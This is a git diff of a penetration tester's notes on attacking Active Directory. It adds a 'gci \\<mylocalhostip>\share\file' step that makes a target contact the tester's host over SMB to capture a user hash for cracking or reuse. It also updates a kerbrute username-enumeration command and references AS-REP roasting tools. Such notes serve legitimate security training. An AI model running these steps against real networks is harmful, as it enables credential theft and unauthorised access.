@@ -21,12 +21,13 @@ https://github.com/Andre92Marcos/tools/blob/master/netexec/README.md#ldap
 
 ## When we have a domain username, but no password
 
+Do a gci request to get the user hash (and use it in other protocols, and try to crack it)
+
+gci \\<mylocalhostip>\share\file #share and file dont have to exist
+
 Run impacket-GetNPUsers
 
    https://github.com/Andre92Marcos/tools/blob/master/impacket/getNPUsers.md
-
-
-## When we get access to a domain user
 
 Use bloodhound
 
@@ -38,7 +39,7 @@ Use the snaffler tool
 
 ## Enumerate users found to see if they pre authenticate to kerberos
 
-   kerbrute userenum --dc <ip_to_domain_controller> -d <full_domain_name>
+   kerbrute userenum --dc <ip_to_domain_controller> -d <full_domain_name> <filename_with_usernames>
 
 ## If we can make the target make a smb request back to us
 
